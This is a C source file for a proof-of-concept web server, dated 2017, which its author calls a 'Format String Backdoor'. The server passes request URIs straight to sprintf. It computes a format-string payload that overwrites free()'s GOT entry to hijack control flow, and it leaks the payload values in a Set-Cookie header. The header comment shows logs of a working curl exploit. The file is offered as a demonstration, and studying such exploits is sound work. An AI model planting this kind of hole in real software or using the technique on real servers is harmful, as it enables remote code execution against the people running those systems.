/*

    This code is modified to make a simple Web Server with non-crashing Format String Backdoor Proof of Concept
    Author: bashis <mcw noemail eu> 2017

    Compile with
    x32: cc -m32 -Wall -o tiny-w3-mcw tiny-w3-mcw.c
    x64: c -Wall -o tiny-w3-mcw tiny-w3-mcw.c

    =====================[Server Side]======================
    $ ./tiny-w3-mcw
    listen on port 9999, fd is 3
    Code: x86

    free() offset: 0x0000b2a4, addr: 0x08048710, got.plt = 0x0804b2a4
    target() ADDR 0x08048bab, MSB 0x0804, LSB 0x8bab

    Saving original got.plt JMP address: 0x08048716

    00: %0$p
    01: 0x1
    02: 0xffeed488
    03: 0xffeeb47c  <- 1st write 'Where' found!
    04: 0xffeeb484  <- 2nd write 'Where' found!
    05: 0xfff07f5a
    06: 0x8049c05   <- 1st write 'What' found!
    07: 0xfff07ed1
    08: 0x8049bf4   <- 2nd write 'What' found!

    Calculated FMS code to use: %45731u%1c%hnXX%hn%55557u%hn%31833u%hn

    1st Wrote where (0xffeeb47c) -> [0x8049c05]
    2nd Wrote where (0xffeeb484) -> [0x8049bf4]

    accept request, fd is 4, pid is 22528
    Code: x86

    free() offset: 0x0000b2a4, addr: 0x08048710, got.plt = 0x0804b2a4
    target() ADDR 0x08048bab, MSB 0x0804, LSB 0x8bab

    1st Wrote where (0xffee81fc) -> [0x804b2a4]
    2nd Wrote where (0xffee8204) -> [0x804b2a6]

    Successfully jumped!

    Modified got.plt is = 0x08048bab (Our target ADDR)
    Restoring got.plt to 0x08048716

    =====================[Client Side]======================

    ['Set-Cookie: SessionID=45731-55557-4-31833' is server calculated generated FSM code, that could be used to remotely generate correct FMS string]

    $ curl -v  '127.0.0.1:9999/%45731u%1c%hnXX%hn%55557u%hn%31833u%hn'

    [truncated]
                       4291825361

    Successfully jumped!

    HTTP/1.1 200 OK
    Content-Type: text/html
    Connection: close
    Cache-Control: no-cache
    Set-Cookie: SessionID=45731-55557-4-31833

    <html><head><title>Format String Backdoor PoC</title></head><body><br>Format String Backdoor <a href="/">PoC</a><br>//bashis</br></body></html>
    * Connection #0 to host 127.0.0.1 left intact
    $
    ==========================================================

    Shamelessy borrowed the source code of the Web-Server from
    Feng Shen
    https://github.com/shenfeng/tiny-web-server
    The code is free to use under the terms of the MIT license
    ==========================================================
 */

#include <arpa/inet.h>          /* inet_ntoa */
#include <signal.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define LISTENQ  1024  /* second argument to listen() */
#define MAXLINE 1024   /* max length of a line */
#define RIO_BUFSIZE 1024

// MCW
#define BUFSIZE 8192
#define VERBOSE 1
#define GOT_COUNT 1

long unsigned int OLD_GOT = 0;  // Saved old GOT address for later restore
int connfd;             // connection socket

#ifdef __x86_64__
int64_t got_plt = 0;
#else
int got_plt = 0;
#endif

typedef struct {
    int rio_fd;                 /* descriptor for this buf */
    int rio_cnt;                /* unread byte in this buf */
    char *rio_bufptr;           /* next unread byte in this buf */
    char rio_buf[RIO_BUFSIZE];  /* internal buffer */
} rio_t;

/* Simplifies calls to bind(), connect(), and accept() */
typedef struct sockaddr SA;

typedef struct {
    char filename[512];
    off_t offset;              /* for support Range */
    size_t end;
} http_request;


void rio_readinitb(rio_t *rp, int fd){
    rp->rio_fd = fd;
    rp->rio_cnt = 0;
    rp->rio_bufptr = rp->rio_buf;
}

ssize_t writen(int fd, void *usrbuf, size_t n){
    size_t nleft = n;
    ssize_t nwritten;
    char *bufp = usrbuf;

    while (nleft > 0){
        if ((nwritten = write(fd, bufp, nleft)) <= 0){
            if (errno == EINTR)  /* interrupted by sig handler return */
                nwritten = 0;    /* and call write() again */
            else
                return -1;       /* errorno set by write() */
        }
        nleft -= nwritten;
        bufp += nwritten;
    }
    return n;
}


/*
 * rio_read - This is a wrapper for the Unix read() function that
 *    transfers min(n, rio_cnt) bytes from an internal buffer to a user
 *    buffer, where n is the number of bytes requested by the user and
 *    rio_cnt is the number of unread bytes in the internal buffer. On
 *    entry, rio_read() refills the internal buffer via a call to
 *    read() if the internal buffer is empty.
 */
/* $begin rio_read */
static ssize_t rio_read(rio_t *rp, char *usrbuf, size_t n){
    int cnt;
    while (rp->rio_cnt <= 0){  /* refill if buf is empty */

        rp->rio_cnt = read(rp->rio_fd, rp->rio_buf,
                           sizeof(rp->rio_buf));
        if (rp->rio_cnt < 0){
            if (errno != EINTR) /* interrupted by sig handler return */
                return -1;
        }
        else if (rp->rio_cnt == 0)  /* EOF */
            return 0;
        else
            rp->rio_bufptr = rp->rio_buf; /* reset buffer ptr */
    }

    /* Copy min(n, rp->rio_cnt) bytes from internal buf to user buf */
    cnt = n;
    if (rp->rio_cnt < n)
        cnt = rp->rio_cnt;
    memcpy(usrbuf, rp->rio_bufptr, cnt);
    rp->rio_bufptr += cnt;
    rp->rio_cnt -= cnt;
    return cnt;
}

/*
 * rio_readlineb - robustly read a text line (buffered)
 */
ssize_t rio_readlineb(rio_t *rp, void *usrbuf, size_t maxlen){
    int n, rc;
    char c, *bufp = usrbuf;

    for (n = 1; n < maxlen; n++){
        if ((rc = rio_read(rp, &c, 1)) == 1){
            *bufp++ = c;
            if (c == '\n')
                break;
        } else if (rc == 0){
            if (n == 1)
                return 0; /* EOF, no data read */
            else
                break;    /* EOF, some data was read */
        } else
            return -1;    /* error */
    }
    *bufp = 0;
    return n;
}


void target() {

  char **restore = (void *)got_plt;
  char buf[BUFSIZE];
  sprintf(buf,"\n\nSuccessfully jumped!\n\n");
  writen(connfd, buf, strlen(buf));

  printf("Successfully jumped!\n\n");
  printf("Modified got.plt is = 0x%08lx (Our target ADDR)\n",(long unsigned int)restore[0]);
  printf("Restoring got.plt to 0x%08lx\n\n",(long unsigned int)OLD_GOT);
    restore[0] = (void *)OLD_GOT;
}


#if GOT_COUNT
/**
 * hex2int
 * take a hex string and convert it to a 32bit number (max 8 hex digits)
 *
 * found this code on some site // bashis
 */
#ifdef __x86_64__
int64_t hex2int(char *hex) {
  int64_t val = 0;
#else
uint hex2int(char *hex) {
    uint val = 0;
#endif
    while (*hex) {
        // get current character then increment
        char byte = *hex++; 
        // transform hex character to the 4bit equivalent number, using the ascii table indexes
        if (byte >= '0' && byte <= '9') byte = byte - '0';
        else if (byte >= 'a' && byte <='f') byte = byte - 'a' + 10;
        // shift 4 to make space for new digit, and add the 4 bits of the new digit 
        val = (val << 4) | (byte & 0xF);
    }
    return val;
}

#endif

int junk()
{

// Here as easy gdb breakpoint before free()
    return(0);
}

int first_fms_where, first_fms_what;
int second_fms_where, second_fms_what;

int misc_function(char *string_buf) {

    int i;
    char first_buf_where[BUFSIZE];
    char first_buf_what[BUFSIZE];
    int first_where = 0, first_what = 0;
    int f1_where = 0, f1_what = 0, f2_where = 0, f2_what = 0;

    char second_buf_where[BUFSIZE];
    char second_buf_what[BUFSIZE];
    int second_where = 0, second_what = 0;

    char offset[BUFSIZE];
    char addr[BUFSIZE];
    char buf[BUFSIZE];

    long unsigned int slask;
    char *format_string;

#if GOT_COUNT
    char tmp[BUFSIZE];
    char MSB[BUFSIZE];
    char LSB[BUFSIZE];
    char GOT[BUFSIZE];
    char target_ADDR[BUFSIZE];
    char target_LSB[BUFSIZE];
    char target_MSB[BUFSIZE];

#define FUNCTION free   // Our jump function - free()
#define TARGET target   // Our target name - target()

#ifdef __x86_64__

#if VERBOSE
    printf("Code: x64\n\n");
#endif

    char **tmp2 = (void *)&FUNCTION;
    snprintf(tmp,19,"%p",(void *)tmp2[0]);
    snprintf(tmp,19,"%016llx",(long long unsigned int)hex2int(strchr(tmp,'x')+1));
    snprintf(offset,9,"%s",tmp + 4); // Extract the offset to got.plt FUNCTION
    snprintf(offset,19,"%016llx",(long long unsigned int)hex2int(offset));

    // Get the address for the desired FUNCTION
    snprintf(tmp,19,"%p",(void *)&FUNCTION);
    snprintf(addr,19,"%016llx",(long long unsigned int)hex2int(strchr(tmp,'x')+1));

    // Calculate the got.plt for FUNCTION
    got_plt = ((hex2int(offset) + hex2int(addr)) + 6);
    snprintf(tmp,19,"%016llx",(long long unsigned int)got_plt);

    // NOTE: Actually not real MSB / LSB for x64; More like MSB / LSB in x86
    // However, this is what's interesting for us
    snprintf(MSB,5,"%s",tmp+8);
    snprintf(LSB,5,"%s",tmp+12);

#if VERBOSE
    printf("free() offset: 0x%s, addr: 0x%s, got.plt = 0x%016llx\n", offset, addr, (long long unsigned int)got_plt);
#endif

    snprintf(tmp,19,"%p",(void *)&TARGET);
    snprintf(addr,19,"%016llx",(long long unsigned int)hex2int(strchr(tmp,'x')+1));
    snprintf(target_ADDR,19,"%s",addr);
    snprintf(target_MSB,5,"%s",addr+8);
    snprintf(target_LSB,5,"%s",addr+12);

#if VERBOSE
    printf("target() ADDR 0x%s, MSB 0x%s, LSB 0x%s\n",target_ADDR,target_MSB,target_LSB);
#endif

#else // __x86_64__

#if VERBOSE
    printf("Code: x86\n\n");
#endif

    // We are actually reading the ASM code here
    char **tmp2 = (void *)&FUNCTION;
    snprintf(tmp,19,"%p",(void *)tmp2[0]);
    snprintf(tmp,19,"%08lx",(long unsigned int)hex2int(strchr(tmp,'x')+1));
    snprintf(offset,5,"%s",tmp); // Extract the offset to got.plt FUNCTION
    snprintf(offset,19,"%08lx",(long unsigned int)hex2int(offset));
    snprintf(LSB,5,"%s",offset+4);

    // Get the address for the desired FUNCTION
    snprintf(tmp,19,"%p",(void *)&FUNCTION);
    snprintf(addr,19,"%08lx",(long unsigned int)hex2int(strchr(tmp,'x')+1));
    snprintf(MSB,5,"%s",addr);
    snprintf(tmp,5,"%s",addr+4);
    
    sprintf(tmp,"%08lx",(long unsigned int)( hex2int(addr) - hex2int(tmp) ));
    got_plt = ( hex2int(offset) + hex2int(tmp) );

#if VERBOSE
    printf("free() offset: 0x%s, addr: 0x%s, got.plt = 0x%08lx\n",offset, addr, (long unsigned int)got_plt);
#endif

    snprintf(tmp,19,"%p",(void *)&TARGET);
    snprintf(addr,19,"%08lx",(long unsigned int)hex2int(strchr(tmp,'x')+1));
    snprintf(target_ADDR,19,"%s",addr);
    snprintf(target_MSB,5,"%s",addr);
    snprintf(target_LSB,5,"%s",addr+4);

#if VERBOSE
    printf("target() ADDR 0x%s, MSB 0x%s, LSB 0x%s\n",target_ADDR,target_MSB,target_LSB);
#endif

#endif // __x86_64__

    sprintf(GOT,"%x",(unsigned int)got_plt);

    if(OLD_GOT == 0){
    char **slask = (void *)got_plt;
    OLD_GOT = (long unsigned int)slask[0];
#if VERBOSE
    printf("\nSaving original got.plt JMP address: 0x%08lx\n\n",(long unsigned int)OLD_GOT);
#endif
    }

#endif // GOT_COUNT


  const char *second = "Second Text";
  // Create one possibility to 'pop'
  char* path = getenv("PATH"); 
  const char *first = "First Text";
  char* home = getenv("HOME");
  const char **second2 = &second;
  const char **first2 = &first;

  // Create enough space on heap for executing the FMS
//  char *format_string;
#ifdef __x86_64__
  format_string = malloc(7340032); // 7 MiB
#else
  format_string = malloc(155648); // 155 KiB
#endif

        // Use the first pointer-to-pointer setup for calculating FMS code
        sprintf(first_buf_where,"%p",(void *)first2);
        sprintf(first_buf_what,"%p",(void *)first);

        // Use the second pointer-to-pointer setup for calculating FMS code
        sprintf(second_buf_where,"%p",(void *)second2);
        sprintf(second_buf_what,"%p",(void *)second);

    if(strlen(string_buf) > 1){


        sprintf(format_string,string_buf); // Format string vulnerable
        writen(connfd, format_string, strlen(format_string));

        }else{
        
        for(i=0;i<200;i++){

            sprintf(buf,"%%%d$p",i); // read the stack with direct argument
            sprintf(format_string,buf);

#if VERBOSE
            printf("%02d: ",i);
            printf("%s",format_string);
#endif
                if(strcmp(format_string,first_buf_where) == 0 && !first_where){
#if VERBOSE
                    printf("\t<- 1st write 'Where' found!\n");
#endif
                    first_where = i;
                } else
                if(strcmp(format_string,first_buf_what) == 0 && !first_what){
#if VERBOSE
                    printf("\t<- 1st write 'What' found!\n");
#endif
                    first_what = i;
                } else
                if(strcmp(format_string,second_buf_where) == 0 && !second_where){
#if VERBOSE
                    printf("\t<- 2nd write 'Where' found!\n");
#endif
                    second_where = i;
                } else
                if(strcmp(format_string,second_buf_what) == 0 && !second_what){
#if VERBOSE
                    printf("\t<- 2nd write 'What' found!\n");
#endif
                    second_what = i;
                } else
#if VERBOSE
                  printf("\n");
#endif
              if(first_where && first_what && second_where && second_what)
                break;

        } // end for
        if(!first_where || !first_what || !second_where || !second_what){
#if VERBOSE
            printf("Did not find our needed where's and what's on stack! exiting\n");
#endif
            exit (1);
        } else {
        
        int ALREADY_WRITTEN;
        

#ifdef __x86_64__
        first_fms_where = (hex2int(GOT) - first_where) + 2; // x64
#define COUNTER 0x620000

#else
        first_fms_where = (hex2int(LSB) - first_where) + 2; // x86
#define COUNTER 0x20000

#endif
        second_fms_where = (second_where);
//        second_fms_where = (second_where  - first_where);
        ALREADY_WRITTEN = first_fms_where + second_fms_where;
    
        first_fms_what = ( (hex2int(target_LSB) + 0x10000) - (hex2int(LSB)) - (first_what - first_where) + 1);
        ALREADY_WRITTEN += first_fms_what;

        second_fms_what = ( ((COUNTER - ALREADY_WRITTEN) + hex2int(target_MSB)) + 1);

        printf("\nCalculated FMS code to use: ");
        printf("%%%du",first_fms_where);
        f1_where = first_fms_where;
        for( i = 2 ; i < first_where ; i++){
            printf("%%1c");
            f1_where++;
        }

// First where
#ifdef __x86_64__
        printf("%%ln"); //x64
#else
        printf("%%hn"); //x86
#endif

        printf("XX");
        f2_where += f1_where;
        f2_where += 2; 
        
// Second where
#ifdef __x86_64__
        printf("%%ln"); //x64
#else
        printf("%%hn"); //x86
#endif

// First what
        printf("%%%du",first_fms_what);
        f1_what += f2_where;
        f1_what += first_fms_what;
        for( i = 3 ; i < (first_what - first_where); i++){
            printf("%%1c");
            f1_what++;
        }
#ifdef __x86_64__
        printf("%%lln"); //x64
#else
        printf("%%hn"); //x86
#endif

// Second what
        printf("%%%du",second_fms_what);
        f2_what += f1_what;
        f2_what += second_fms_what;
        for( i = 4 ; i < (second_what - second_where); i++){
            printf("%%1c");
            f2_what++;
        }

        printf("%%hn\n");

        } // end if 'if(first_where == 0 || ....'

  }

    printf("\n");

#if VERBOSE
    printf("1st Wrote where (%p) -> [%p]\n",(void *)first2,(void *)first);
    printf("2nd Wrote where (%p) -> [%p]\n",(void *)second2,(void *)second);
#endif

#if VERBOSE
    printf("\n");
#endif

    // Not used for anything, only for grouping and creating POP spaces on stack
    // Assigning and stuff to not have any warnings
    slask = (long unsigned int)&first2;
    slask = (long unsigned int)&second2;
    slask = (long unsigned int)&home;
    slask = (long unsigned int)&path;
    slask++;
    slask--;

    junk(); // Useful for gdb break
    free(format_string); // This call is our target for jumping where we want.

    return 0;
}


int open_listenfd(int port){
    int listenfd, optval=1;
    struct sockaddr_in serveraddr;

    /* Create a socket descriptor */
    if ((listenfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        return -1;

    /* Eliminates "Address already in use" error from bind. */
    if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR,
                   (const void *)&optval , sizeof(int)) < 0)
        return -1;

    // 6 is TCP's protocol number
    // enable this, much faster : 4000 req/s -> 17000 req/s
    if (setsockopt(listenfd, 6, TCP_CORK,
                   (const void *)&optval , sizeof(int)) < 0)
        return -1;

    /* Listenfd will be an endpoint for all requests to port
       on any IP address for this host */
    memset(&serveraddr, 0, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
    serveraddr.sin_port = htons((unsigned short)port);
    if (bind(listenfd, (SA *)&serveraddr, sizeof(serveraddr)) < 0)
        return -1;

    /* Make it a listening socket ready to accept connection requests */
    if (listen(listenfd, LISTENQ) < 0)
        return -1;
    return listenfd;
}

void url_decode(char* src, char* dest, int max) {
    char *p = src;
    char code[3] = { 0 };
    while(*p && --max) {
        if(*p == '%') {
            memcpy(code, ++p, 2);
            *dest++ = (char)strtoul(code, NULL, 16);
            p += 2;
        } else {
            *dest++ = *p++;
        }
    }
    *dest = '\0';
}

void parse_request(int fd, http_request *req){
    rio_t rio;
    char buf[MAXLINE], method[MAXLINE], uri[MAXLINE];
    req->offset = 0;
    req->end = 0;              /* default */

    rio_readinitb(&rio, fd);
    rio_readlineb(&rio, buf, MAXLINE);
    sscanf(buf, "%s %s", method, uri); /* version is not cared */
    /* read all */
    while(buf[0] != '\n' && buf[1] != '\n') { /* \n || \r\n */
        rio_readlineb(&rio, buf, MAXLINE);

    }
    char* filename = uri;
    if(uri[0] == '/'){
        filename = uri + 1;
    // Call our FMS function
    misc_function(filename);
    }
    url_decode(filename, req->filename, MAXLINE);
}


void process(int fd, struct sockaddr_in *clientaddr){
    printf("accept request, fd is %d, pid is %d\n", fd, getpid());
    http_request req;
    parse_request(fd, &req);

    char buf[BUFSIZE];
    bzero(buf, BUFSIZE);

    sprintf(buf, "HTTP/1.1 200 OK\r\n%s%s%s",
            "Content-Type: text/html\r\n",
            "Connection: close\r\n",
            "Cache-Control: no-cache\r\n");
    sprintf(buf + strlen(buf),"Set-Cookie: SessionID=%d-%d-%d-%d\r\n\r\n",first_fms_where,first_fms_what,second_fms_where,second_fms_what);
    sprintf(buf + strlen(buf), "<html><head><title>Format String Backdoor PoC</title></head><body><br>Format String Backdoor PoC<br><br>Have a nice day<br>/bashis</br></body></html>\r\n");

    writen(fd, buf, strlen(buf));
        close(fd);


}

int main(int argc, char** argv){
    struct sockaddr_in clientaddr;
    int default_port = 9999,
        listenfd;
    socklen_t clientlen = sizeof clientaddr;

    listenfd = open_listenfd(default_port);
    if (listenfd > 0) {
        printf("listen on port %d, fd is %d\n", default_port, listenfd);
    } else {
        perror("ERROR");
        exit(listenfd);
    }
    // Ignore SIGPIPE signal, so if browser cancels the request, it
    // won't kill the whole process.
    signal(SIGPIPE, SIG_IGN);
    // Call our FMS function
    misc_function("");

    while(1){
        connfd = accept(listenfd, (SA *)&clientaddr, &clientlen);
        process(connfd, &clientaddr);
        close(connfd);
    }

    return 0;
}
